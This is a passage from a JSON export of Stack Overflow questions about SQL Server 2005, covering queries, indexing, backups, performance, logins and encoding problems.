the server is restarted, so I can use it in functions?</p>\n\n<p>Example from what I need:</p>\n\n<pre><code>DECLARE @@DefaultValue bit\n</code></pre>\n\n<p>This variable should never be deleted unless I explicityl do so.</p>\n"},{"tags":["sql-server","sql-server-2005","datetime"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12474746,"title":"How to convert date in SQL Server 2005 (andika)","body":"<p>I have a table in my database with a column that I want to change from <code>varchar</code> to <code>datetime</code>.</p>\n\n<p>In my database the <code>tgl_lahir</code> column contains data in format : <code>1969-10-30 00:00:00</code></p>\n\n<pre><code>SELECT convert (datetime, substring(tgl_lahir, 9, 2)\n               +(substring(tgl_lahir, 6, 2) )\n               + (left(tgl_lahir, 4)))\nfrom penduduk\n</code></pre>\n\n<p>Can anyone help me ?</p>\n\n<p>I got the following error message:</p>\n\n<blockquote>\n  <p>Msg 242, Level 16, State 3, Line 2<br>\n  The conversion of a char data type to a datetime data type resulted in an out-of-range datetime value.</p>\n</blockquote>\n"},{"tags":["sql-server","sql-server-2005","scheduling","maintenance-plan"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":15,"score":2,"question_id":12426231,"title":"MS SQL 2005: Strange Maintenance Plan SubPlans behaviour: each SP runs all the tasks of all other SP at odd times","body":"<p>(SQL Server 2005) I have a problem with scheduling a Maintenance Plan (MP) with 3 subplans (SP).</p>\n\n<ul>\n<li>SP1 is scheduled to run hourly,</li>\n<li>SP2 daily at 7.00 and </li>\n<li>SP3 on sundays at 8.00</li>\n</ul>\n\n<p>Reading MP history I see that what happened (I know it seems crazy) is:</p>\n\n<pre><code>11: SP1 runs and executes all the tasks of SP1 SP2 and SP3\n12: SP2 runs and does the same\n13: SP3 runs and does the same\n14: SP1 runs and does the same\n</code></pre>\n\n<p>From the job Activity monitor, SP1 has last run time at 14, SP2 and SP3 are <em>never</em> been executed.<br>\nAll of the SP are scheduled correctly in the Job Activity Monitor (SP2 for tomorrow at 7, SP3 for next sunday at 8)</p>\n\n<p>Do you have any idea what is happening?</p>\n\n<p>Thankx a lot</p>\n\n<p>Wentu</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":135,"score":1,"question_id":9141925,"title":"SQL restore transaction log from disk getting incorrect syntax","body":"<p>The command I am using  is below and i'm getting incorrect syntax near 'E:'  What am I misisng or what do I have wrong?  Thanks for the help everybody!</p>\n\n<pre><code>restore log ib_qc FROM DISK 'e:\\backup_201202030600.trn' WITH NORECOVERY\n</code></pre>\n"},{"tags":["database","sql-server-2005","shrink"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":24,"score":0,"question_id":12471390,"title":"When do I need to Shrink a database?","body":"<p>I have a 55GB database.The full backup size is around 47GB. How can I shrink the database?</p>\n"},{"tags":["sql","sql-server","database","sql-server-2005","database-performance"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":97,"score":5,"question_id":12445727,"title":"Using \"CASE\" in Where clause to choose various column harm the performance","body":"<p>I have query which needs to be dynamic on some of the columns, meaning I get a parameter and according its value I decide which column to fetch in my Where clause. I've implemented this request using \"CASE\" expression:</p>\n\n<pre><code>(CASE @isArrivalTime WHEN 1 THEN ArrivalTime ELSE PickedupTime END) \n&gt;= DATEADD(mi, -@TZOffsetInMins, @sTime) \n AND (CASE @isArrivalTime WHEN 1 THEN ArrivalTime ELSE PickedupTime END) \n &lt; DATEADD(mi, -@TZOffsetInMins, @fTime)\n</code></pre>\n\n<p>If <code>@isArrivalTime = 1</code> then chose <code>ArrivalTime</code> column else chose <code>PickedupTime</code> column. I have a clustered index on <code>ArrivalTime</code> and nonclustered index on <code>PickedupTime</code>.</p>\n\n<p>I've noticed that when I'm using this query (with <code>@isArrivalTime = 1</code>), my performance is a lot worse comparing to only using <code>ArrivalTime</code>. </p>\n\n<p>Maybe the query optimizer can't use\\choose the index properly in this way?</p>\n\n<p>I compared the execution plans an noticed that when I'm using the <code>CASE</code> 32% of the time is being wasted on the index scan, but when I didn't use the CASE<code>(just used</code>ArrivalTime`) only 3% were wasted on this index scan.</p>\n\n<p>Anyone know the reason for this?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":256,"score":2,"question_id":585441,"title":"Rollback complete database one hour","body":"<p>We had some problems this morning and need to rollback our database for about one hour. Is this possible and how is it done?</p>\n\n<p>It is a Microsoft SQL 2005 database.</p>\n"},{"tags":["c#","sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12469959,"title":"Transactions should be handled in .NET or SQL Server?","body":"<p>I got into an application which is using .NET/C# as front end and SQL Server 2008 as back end. I found that ALWAYS transactions are handled in the c# code. Seems its an unwritten rule for this project that we shouldn't use Transactions within stored procedure.</p>\n\n<p>I personally feel that transactions should be handled within Stored Procedure as it would give more control over the code! We might have lot of validations happening within the script all this while we don't need a open transaction. We need to open a transaction just before we do a Insert/Update/Delete and can close it asap. </p>\n\n<p>Looking for answers which would help me understand the best practice for handling transactions and when exactly do we need to opt for Transactions within Stored Proc / C#.</p>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":4,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":853,"score":8,"question_id":5323300,"title":"How to avoid multiple login for the same user","body":"<p>I wanted to stop multiple login of the same user. So, I created a table which keeps track of users who have logged in. When they log in, the data will be entered in the table. When they click on logout, data and session will be removed.</p>\n\n<p>The problem is, when they close the browser window without logging out, they won't be able to login ever again. </p>\n\n<p>Is there a better way to handle this? </p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12469127,"title":"Entity Revisioning Schema Design","body":"<p>SQL Server 2005.</p>\n\n<p>In our application, we have an entity with a parent table as well as several child tables. We would like to track revisions made to this entity. After going back and forth, we've narrowed it down to two approaches to choose from.</p>\n\n<ol>\n<li><p>Have one history table for the entity. Before a sproc updates the table, retrieve the entire current state of the entity from the parent table and all child tables. XMLize it and stick it into the history table as the XML data type. Include some columns to query by, as well as a revision number/created date.</p></li>\n<li><p>For each table, create a matching history table with the same columns. Also have a revision number/created date. Before a sproc updates a single table, retrieve the existing state of the record for that one table, and copy it into the history table. So, it's a little bit like SVN. If I want to get an entity at revision Y, I need to get the history record in each table with the maximum revision number that is not greater than Y. An entity might have 50 revision records in one table, but only 3 revision records in a child table, etc. I would probably want to persist the revision counter for the entire entity somewhere.</p></li>\n</ol>\n\n<p>Both approaches seem to have their headaches, but I still prefer solution #2 to solution #1. This is a database that's already huge, and already suffers from performance issues. Bloating it with XML blobs on every revision (and there will be plenty) seems like a horrible way to go. Creating history tables for everything is a cost I'm willing to eat, as long as there's not a better way to do this.</p>\n\n<p>Any suggestions?</p>\n\n<p>Thanks,\nTedderz</p>\n"},{"tags":["sql-server-2005","cpu-usage","sql-server-performance"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":189,"score":0,"question_id":12458776,"title":"SQL Server 100% CPU Utilization - One database shows high CPU usage than others","body":"<p>We have an SQL server with about 40 different (about 1-5GB each) databases. The server is  an 8 core 2.3G CPU with 32Gigs of RAM. 27Gig is pinned to SQL Server. The CPU utliziation is mostly close to 100% always and memory consumption is about 95%. The problem here is the CPU which is constantly close to 100% and trying to understand the reason.</p>\n\n<p>I have run an initial check to see which database contributes to high CPU by using - <a href=\"http://stackoverflow.com/questions/10319575/sql-server-2008-high-cpu-usage\">this</a> script but I could not substantiate in detail on whats really consuming CPU. The top query (from all DBs) only takes about 4 seconds to complete. IO is also not a bottleneck. </p>\n\n<p>Would Memory be the culprit here? I have checked the memory split and the OBJECT CACHE occupies about 80% of memory allocated (27G) to SQL Server. I hope that is normal provided there are lot of SPs involved. Running profiler, I do see lot of recompiles, but mostly are due to \"temp table changed\", \"deferred compile\" etc and am not clear if these recompiles are a result of plans getting thrown out of cache due to memory pressure</p>\n\n<p>Appreciate any thoughts.</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12465865,"title":"Case to extract multiple columns","body":"<p>I am wondering if there is something like Case where i can wok in SQL for getting multiple columns using 1 case expression in SQL Server 2005.  I am a rookie in SQL. Hope it is not too easy and i missed it. Thank you in advance!!  </p>\n\n<pre><code>Select RD.RepDailyInfoID, RD.TypeofDayID\nCase WHEN RD.TypeofDayID = 1\nTHEN \n    isnull(cast(S.AmountSold as numeric(10,2)), 0) as AmountSold,\n    isnull(cast(S.S_AmountCollected as numeric(10,2)), 0) as AmountCollected,\n    S.S_PaymentMethod as PaymentMethod\n\nWhen RD.TypeofDayID = 9\nTHEN\n    isnull(cast(U.AmountUpgraded as numeric(10,2)), 0) as AmountUpgraded,\n    isnull(cast(U.U_UpgradedCollected as numeric(10,2)), 0) + isnull(cast(U.RenewalCollected as numeric(10,2)), 0) as AmountCollected,\n    U.U_PaymentMethod as PaymentMethod\nEND\nfrom RepDailyInfo RD\nleft outer join SellingInfo S on S.RepDailyInfoID = RD.RepDailyInfoID\nleft outer join UpgradingInfo U on U.RepDailyInfoID = RD.RepDailyInfoID\nwhere RepID = @RepID\n</code></pre>\n"},{"tags":["sql-server","database","sql-server-2005","portability"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12465027,"title":"what and where can I find the database/table files for sql server 2005?","body":"<p>In my sql server 2005 I have a database named <em>movies</em> . In this database I have a table named <em>list</em>. I wanted to test my application on some another machine. Is there any way I can take with me that database or tables so that there is no need to create them again there. What type of files are they if there is a way  out other than creating a new database and tables again</p>\n"},{"tags":["sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":11403665,"title":"Find fields that aren't used (have all nulls)","body":"<p>I've inherited a legacy database, and many, many fields are no longer being used. I can tell by querying on the last couple of years and seeing which fields are null, to at least get a baseline for where I might look.</p>\n\n<p>Is there an elegant way to figure out which fields in the database are null for all records in a given set?</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12461605,"title":"remove duplicate values from the column of the table without deleting the row of the table","body":"<p>I have written this code </p>\n\n<pre><code>SELECT  \n\ncast(isnull(x.hc,'') AS VARCHAR(500)) as A,\n\nCase\nWhen cast(isnull(p.dg,'') AS VARCHAR(500)) = '0' then ''\nelse cast(isnull(p.dg,'') AS VARCHAR(500))\nEnd as B, \n\nCase\nWhen cast(isnull(h.cno,'') as varchar(500)) = '0' then ''\nelse cast(isnull(h.cno,'') as varchar(500))\nEnd as C, --added\n\ncast(isnull(p.vol,0) as varchar(500)) as D,\n\ncast(isnull(p.weigh,0) as varchar(500)) as E\n\nFROM ship g\ninner join S_M d on d.ship_id = g.ship_id\nleft join Pack h on h.ship_id = g.ship_id\nleft join pack_d p on p.pack_id = h.pack_id\nleft join comm x on x.comm_id = p.comm_id\nWHERE g.ship_pk = @ship_pk \nGROUP BY  cast(isnull(x.hc,'') AS VARCHAR(500)), cast(isnull(p.dg,'') AS VARCHAR(500)), cast(isnull(h.cno,'') as varchar(500)), cast(isnull(p.vol,0) as varchar(500)), cast(isnull(p.weigh,0) as varchar(500)) \n</code></pre>\n\n<p>Which gives me the ouput as </p>\n\n<pre><code>A     B      C        D        E\n\n123   Yes    AB456    26.34    28.45\n123   Yes    AB687    26.34    28.45\n125   No     AB794    22.58    24.36\n125   No     AB456    22.58    24.36\n125   No     AB687    22.58    24.36\n</code></pre>\n\n<p>How Can I change my code above so that I can get the Output as</p>\n\n<pre><code>A     B      C        D        E\n\n123   Yes    AB456    26.34    28.45\n             AB687    26.34    28.45\n125   No     AB794    22.58    24.36\n             AB456    22.58    24.36\n             AB687    22.58    24.36\n</code></pre>\n\n<p>How can I remove the duplicate values from the first two columns of the table\nAs shown above? \nI am not deleting any row here, instead just removing the duplicate values and keeping that field blank.</p>\n\n<p>How can I do that? </p>\n"},{"tags":["windows","sql-server-2005","login"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12404525,"title":"MSSQL 2005 login error","body":"<p>I am the first time user of MSSQL Server. I installed it on my windows 7 machine. When i tried to login to the server it gives me an error,</p>\n\n<pre><code>Login failed for user 'Admin-PC\\Admin'. (.Net SqlClient Data Provider)\n\nLogin failed - Error Number: 18456 - Severity: 14 - State: 1\n</code></pre>\n\n<p>I am using windows default authentication. </p>\n"},{"tags":["sql","oracle","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12448277,"title":"OWA_UTIL.WHO_CALLED_ME in SQL Server","body":"<p>I am looking for equivalent, if there is any, of the procedure OWA_UTIL.WHO_CALLED_ME from Oracle in SQL Server. </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3109,"score":1,"question_id":378752,"title":"Map to Network Drive By SQL SP","body":"<p>Is there any way to map to a network drive by using a stored procedure? I have tried: </p>\n\n<pre><code>xp_cmdshell 'net use Q: [shared_network_drive] [pwd] /user:[username]'\n</code></pre>\n\n<p>but I got an error saying something like </p>\n\n<pre><code>'System error 1312 has occurred.'\n'A specified logon session does not exist. It may already have been terminated.'\n</code></pre>\n\n<p>However, when I run the same command in a cmd console in the same box as the SQL server machine, there is no problem at all. It looks like that SQL process does pass correct logon credential information. Any way to do it by SQL SP?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","port","sql-server-2012"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12404563,"title":"SQL Server port","body":"<p>I have more than one instance of SQL Server installed on my PC (actually, one 2005, one 2008 and one 2012). All of them running. I realized that all of them are configured (SQL Server Configuration Manager ->  SQL Server Network Configuration -> Protocols for the Database Engine -> TCP/IP) to run on port 1433.</p>\n\n<p>How is it possible?</p>\n"},{"tags":["sql","sql-server-2005","join"],"answer_count":1,"favorite_count":2,"up_vote_count":2,"down_vote_count":1,"view_count":45,"score":1,"question_id":12438868,"title":"Simple SQL JOIN Issue","body":"<p>I have a simple <code>JOIN</code> that I'm having issues with the <code>SQL</code> below.  This statement returns 1 record, but if I comment out line #5 it doesn't return any. Any ideas?</p>\n\n<pre><code>SELECT A.district__c, b.annual_conference__c\nFROM   Contact_UpdateDistricts A\nJOIN   Contact B on a.id = b.id\nWHERE  A.error NOT LIKE '%success%'\nand a.id = '003Z000000C80tUIAR'\nand A.district__c &lt;&gt; b.annual_conference__c\n</code></pre>\n"},{"tags":["java","sql-server","sql-server-2005","netbeans"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12449956,"title":"what is meant by Instance name?","body":"<p>what is a <em>sql server instance</em> ? what does it mean and why do why need it ?</p>\n\n<p>I needed here :</p>\n\n<p><img src=\"http://i.stack.imgur.com/2nmQc.jpg\" alt=\"enter image description here\"></p>\n\n<p>What does an instance name mean ?</p>\n"},{"tags":["java","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12448668,"title":"connecting to the database engine in Microsoft SQL Server 2005","body":"<p>I had to connect my netbeans application to Microsoft SQL Server 2005 so that I am able to read the data back to application (after I store it !) . But I haven't  been able to create a table yet since I am able to connect to the database engine as it says.</p>\n\n<p>How do I connect to the database engine in Microsoft SQL Server 2005 ? This is what it currently displays when I open <em>Microsoft Server SQL Management Studio</em> :</p>\n\n<p><img src=\"http://i.stack.imgur.com/JKFf2.jpg\" alt=\"enter image description here\"></p>\n\n<p>and this is the SQL Server Configuration Manager :</p>\n\n<p><img src=\"http://i.stack.imgur.com/hg2mU.jpg\" alt=\"enter image description here\"></p>\n\n<p>Now what do I do to connect to the database engine ?</p>\n\n<p><em>Note : Please let me know if I need to add some more information</em></p>\n"},{"tags":["sql","sql-server","sql-server-2005","performance","tsql"],"answer_count":4,"favorite_count":4,"up_vote_count":11,"down_vote_count":0,"view_count":7166,"score":11,"question_id":1662902,"title":"When to use EXCEPT as opposed to NOT EXISTS in Transact SQL?","body":"<p>I just recently learned of the existence of the new \"EXCEPT\" clause in SQL Server (a bit late, I know...) thru reading code written by a coworker. It truly amazed me!</p>\n\n<p>But then I have some questions regarding its usage: when is it recommended to be employed? Is there a difference, performance-wise, between using it versus a correlated query employing \"AND NOT EXISTS...\"?</p>\n\n<p>After reading EXCEPT's article in the BOL I thought it was just a shorthand for the second option, but was surprised when I rewrote a couple queries using it (so they had the \"AND NOT EXISTS\" syntax much more familiar to me) and then checked the execution plans - surprise! The EXCEPT version had a shorter execution plan, and executed faster, also. Is this always so?</p>\n\n<p>So I'd like to know: what are the guidelines for using this powerful tool?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":12437110,"title":"Separate numeric & character data using SQL Server 2005 query","body":"<p>I want to separate my data in column, my data is </p>\n\n<pre><code>column1\n1.1.1 Eastern express highway\n1.1.2 weater way\n2.1 water\n2.1.2 land\n2.2 sand\n</code></pre>\n\n<p>My output should be</p>\n\n<pre><code>column1      column2       column3\n1.1            1           Eastern express highway\n1.1            2            weater way\n2.1            0            water\n2.1            2            land\n2.2            0            sand\n</code></pre>\n"},{"tags":["sql-server-2005","function"],"answer_count":5,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":29266,"score":7,"question_id":150552,"title":"Executing dynamic SQL in a SQLServer 2005 function","body":"<p>I will preface this question by saying, I do not think it is solvable. I also have a workaround, I can create a stored procedure with an OUTPUT to accomplish this, it is just easier to code the sections where I need this checksum using a function.</p>\n\n<p>This code will not work because of the <code>Exec SP_ExecuteSQL @SQL</code> calls. Anyone know how to execute dynamic SQL in a function? (and once again, I do not think it is possible. If it is though, I'd love to know how to get around it!)</p>\n\n<pre><code>Create Function Get_Checksum\n(\n    @DatabaseName      varchar(100),\n    @TableName         varchar(100)\n)\nRETURNS FLOAT\nAS\nBEGIN\n\n Declare @SQL        nvarchar(4000)\n Declare @ColumnName varchar(100)\n Declare @i          int\n Declare @Checksum   float\n Declare @intColumns table (idRecord int identity(1,1), ColumnName varchar(255))\n Declare @CS         table (MyCheckSum bigint)\n\n Set @SQL = \n        'Insert Into @IntColumns(ColumnName)' + Char(13) + \n        'Select Column_Name' + Char(13) +\n        'From   ' + @DatabaseName + '.Information_Schema.Columns (NOLOCK)' + Char(13) +\n        'Where  Table_Name = ''' + @TableName + '''' + Char(13) +\n        '       and Data_Type = ''int''' \n\n -- print @SQL\n\n exec sp_executeSql @SQL\n\n Set @SQL = \n        'Insert Into @CS(MyChecksum)' + Char(13) + \n        'Select '\n\n Set @i = 1\n\n While Exists(\n       Select 1\n       From   @IntColumns\n       Where  IdRecord = @i)\n begin\n       Select @ColumnName = ColumnName\n       From   @IntColumns\n       Where  IdRecord = @i\n\n       Set @SQL = @SQL + Char(13) + \n            CASE WHEN @i = 1 THEN \n                 '    Sum(Cast(IsNull(' + @ColumnName + ',0) as bigint))'\n                 ELSE\n                 '    + Sum(Cast(IsNull(' + @ColumnName + ',0) as bigint))'\n            END\n\n       Set @i = @i + 1\n end\n\n Set @SQL = @SQL + Char(13) + \n      'From ' + @DatabaseName + '..' + @TableName + ' (NOLOCK)'\n\n -- print @SQL\n\n exec sp_executeSql @SQL\n\n Set @Checksum = (Select Top 1 MyChecksum From @CS)\n\n Return isnull(@Checksum,0)\n\nEND\nGO\n</code></pre>\n"},{"tags":["c#","asp.net","sql-server-2005"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":746,"score":0,"question_id":1319629,"title":"Manipulate SQL data in memory?","body":"<p>I have tables and a lot of sotred procedure that work with sql database.<br />\nFor demonstration purposes I want to load data into memory (maybe dataset that i can then store in session- the demnonstration is limited so server memory cap won't be a problem ?) from my sql tables and manipulate it with my stored procedures.  </p>\n\n<p>Is it possible? Or i need to rewrite all my stored procedures or even replace them with code that works with data set?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":160,"score":0,"question_id":12435469,"title":"Sql query to split one column into two columns","body":"<p>I have one single column as project name, the data in \nproject name </p>\n\n<pre><code>1.1.1 chapter1\n1.1.2 chapter2\n</code></pre>\n\n<p>I want to divide that single column into two columns as</p>\n\n<pre><code>Major   Minor\n1.1     .1 chapter1\n1.1     .2 chapter2\n</code></pre>\n\n<p>the datatype of my project name column is nvarchar,\nI am using sql 2005</p>\n\n<p>Any help?</p>\n"},{"tags":["sql-server-2005","sql-server-2008-r2","service-broker"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12419887,"title":"SQL Server 2005 Service Broker behaviour for poison messages","body":"<p>When creating a Service Broker Queue in SQL 2008 R2, you can specify the POISON_MESSAGE_HANDLING status as ON or OFF. If it's on, as I understand, after 5 consecutive rollbacks of a message, the message is treated as a poison message, and the queue is automatically disabled. The BROKER_QUEUE_DISABLED event is also raised.</p>\n\n<p>In SQL 2005 (and 2008 non-R2), you don't get the option of the POISON_MESSAGE_HANDLING setting. Does SQL 2005 behave the same as 2008 R2 with this setting ON, or this setting OFF, or something different?</p>\n"},{"tags":["sql","sql-server-2005","sql-order-by","sql-in"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12435148,"title":"Incorrect order of results in \"IN\" of SQL","body":"<p>I need help in ordering my resultset of SQL Server 2005. My Query is </p>\n\n<pre><code>Select RQuery from EPMaster where PName IN ('PFNAME','POName','PFSName');\n</code></pre>\n\n<p>The result shown is in order as stored in the table <strong>EPMaster</strong></p>\n\n<p>In the table <strong>EPMaster</strong>, the order for values of <strong>PName</strong> are:</p>\n\n<pre><code>PFName -&gt; 1\nPFSName -&gt; 2\nPOName -&gt; 3\n</code></pre>\n\n<p>1 being the topmost and 3 being lowest</p>\n\n<p>I need the results in order of the passed parameters of the query made with <code>IN</code>. It means that the result should be in the form</p>\n\n<pre><code>PFName -&gt; 1\nPOName -&gt; 2\nPFsName -&gt; 3\n</code></pre>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008r2-express"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12391124,"title":"How to create Table with Module name Prefixed?","body":"<p>I downloaded AdentureWorks Database and found a new style to create a table like below.</p>\n\n<ol>\n<li>Sales.SalesOrderHeader</li>\n<li>Person.Person</li>\n<li>Sales.SalesOrderDetail</li>\n</ol>\n\n<p>Can you explain how to create table which can have a module prefix ?</p>\n\n<p>Please let me know if you have any confusion in the query...</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12434734,"title":"Rebuilding / Reorganizing indexes not working properly on sql server 2005","body":"<p>I run script to find Fragmentation level on table named \"ABC\" and found following avg frag. in percentage :-</p>\n\n<p>Index_type_desc                                      avg_fragmentation_in_percent</p>\n\n<p>HEAP                        98.03427419</p>\n\n<p>NONCLUSTERED INDEX  3.495630462</p>\n\n<p>NONCLUSTERED INDEX  100</p>\n\n<p>NONCLUSTERED INDEX  0.601202405</p>\n\n<p>NONCLUSTERED INDEX  60\nNONCLUSTERED INDEX  10.6302202</p>\n\n<p>NONCLUSTERED INDEX  100</p>\n\n<p>NONCLUSTERED INDEX  10.2739726</p>\n\n<p>NONCLUSTERED INDEX  100</p>\n\n<p>NONCLUSTERED INDEX  3.709550118</p>\n\n<p>NONCLUSTERED INDEX  62.5</p>\n\n<p>NONCLUSTERED INDEX  22.15954875</p>\n\n<p>NONCLUSTERED INDEX  100</p>\n\n<p>NONCLUSTERED INDEX  0.651840491</p>\n\n<p>NONCLUSTERED INDEX  6.849315068</p>\n\n<p>Then i applied rebuild / Reorganize indexes on this table through right click on indexes in S.S.M.S. After rebuilding / Reorganizing i run same script to check frag. level then result showing 0 for Nonclustered Indexed but heap index frag. percentage not updating.</p>\n\n<p>And other problem is when i run this script on same table after 24 hours it showing same avg_frag. percentage for all indexes as it was showing before Rebuilding / Reorganizing indexes.</p>\n\n<p>Please tell me where i am doing wrong. And  help me to reduce fragmentation percentage of indexes for fast result from queries.</p>\n\n<p>Thanx in advance</p>\n\n<p>Neel</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008-r2"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":6,"view_count":39,"score":-5,"question_id":12413283,"title":"Duplicate Records","body":"<p>I Have table Xtr in Sq Server format is below</p>\n\n<pre><code>OURID   FACLITY\n1           A\n1           b\n2           C\n3           D\n3           b\n3           A\n2           A\n4           B\n5           B\n</code></pre>\n\n<p>I want output like where faclity value are a and b which are having same value like below output</p>\n\n<pre><code>OURID    FACLITY\n1           A\n1           b\n3           b\n3           A\n</code></pre>\n\n<p>Please help</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","indexing"],"answer_count":6,"favorite_count":14,"up_vote_count":34,"down_vote_count":1,"view_count":14303,"score":33,"question_id":1307990,"title":"Why use the INCLUDE clause when creating an index?","body":"<p>While studying for the 70-433 exam I noticed you can create a covering index in one of the following two ways.</p>\n\n<pre><code>CREATE INDEX idx1 ON MyTable (Col1, Col2, Col3)\n</code></pre>\n\n<p>-- OR --</p>\n\n<pre><code>CREATE INDEX idx1 ON MyTable (Col1) INCLUDE (Col2, Col3)\n</code></pre>\n\n<p>The INCLUDE clause is new to me.  Why would you use it and what guidelines would you suggest in determining whether to create a covering index with or without the INCLUDE clause?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","permissions",".net-assembly"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12432416,"title":"unsafe assembly permission was denied on object 'server' database 'master'","body":"<p>How do I add permissions for this:</p>\n\n<pre><code>unsafe assembly permission was denied on object 'server' database 'master'\n</code></pre>\n"},{"tags":["sql-server-2005","encoding"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12433364,"title":"Where to trim/encode/fix characters from end to end ASP to SQL?","body":"<p>I have an ASP Classic app that allows people to copy and paste Word documents into a regular form field. I then post that document via jQuery Ajax to SQL Server, where the information is saved.</p>\n\n<p>My problem is that the curly quotes and other word characters turn into strange characters when they come back out.</p>\n\n<p>I'm trying to filter them on my save routines (classic asp stored procedure), but I still can't quite eliminate the problems.</p>\n\n<p>The ASP pages have this header with the ISO-8859-1 charset. Characters look fine when pasted into the text input fields.</p>\n\n<p><code>&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n    &lt;html xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" lang=\"en\"&gt;&lt;head&gt;\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=ISO-8859-1\"&gt;\n</code></p>\n\n<p>My jQuery code builds the following JSON in the ASP Page:</p>\n\n<p><code>var jsonToSend={ serial: serial, critiqueText: escape(critiqueText) } ;</code></p>\n\n<p>The database collation is set to <strong>SQL_Latin1_General_CP1_CI_AS</strong></p>\n\n<p>I use TEXT and VARCHAR fields to hold the text (yes, I know the Text field type is not preferred, but it's what I have right now).</p>\n\n<p>What must I do at each point to ensure that (1) the Word characters are stripped out, and (2) the encoding is consistent from front to back so I don't get any odd characters displaying?</p>\n\n<p>Oh-  ASP Classic 3 running in 32-bit mode on Windows Server 2003 against SQL Server 2005.</p>\n"},{"tags":["sql","sql-server","query","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12427895,"title":"do query one table if exist else doesn't","body":"<p>I'm working with SQL 2005, and have the following code:</p>\n\n<pre><code>DECLARE @exist4 INT\nIF ( SELECT COUNT(*) existe\n     FROM   sysobjects obj\n     WHERE  obj.name = 'table4'\n   ) &gt; 0 \n    BEGIN \n        SET @exist4 = 1\n    END\nELSE \n    BEGIN \n        SET @exist4 = 0\n    END\n\n/*now if table4 exist i need add to my query but if i do something as it\ni got next error\nInvalid object name 'table4'.*/\n\n\nIF ( @exist4 = 0 ) \n    BEGIN\n\n        SELECT  [table].col1 ,\n                [table].col2 ,\n                [table].col3 ,\n                [table].colN\n        FROM    [table] ,\n                table2 ,\n                table3\n        WHERE   [table].id = table1.id\n                AND table3.id = table2.id\n    END\nELSE \n    BEGIN\n        SELECT  [table].col1 ,\n                [table].col2 ,\n                [table].col3 ,\n                [table].colN\n        FROM    [table] ,\n                table2 ,\n                table3 ,\n                table4\n        WHERE   [table].id = table2.id\n                AND table3.id = table2.id\n                AND table4.id = table3.id\n    END\n</code></pre>\n\n<p>This code returns an error when Table4 does not exist.  How can I get this query to work?</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12417956,"title":"Import Excel worksheet into SQL 2005","body":"<p>I have an SISS package that imports from Excel into SQL 2005. The name of the worksheet changes 